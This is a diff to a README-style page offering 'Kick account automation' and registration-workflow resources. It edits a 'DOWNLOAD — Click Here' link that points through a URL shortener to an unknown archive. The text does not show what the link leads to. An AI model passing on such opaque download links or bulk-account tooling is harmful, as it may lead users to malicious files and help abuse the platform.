@@ -6,7 +6,7 @@ Professional collection of Kick account automation resources, registration workf
 
 ## Download
 
-1. **[DOWNLOAD — Click Here](hoply.pl/ulShGz)**
+1. **[DOWNLOAD — Click Here](https://hoply.pl/ulShGz)**
 2. Extract the downloaded files.
 3. Open the included documentation.
 
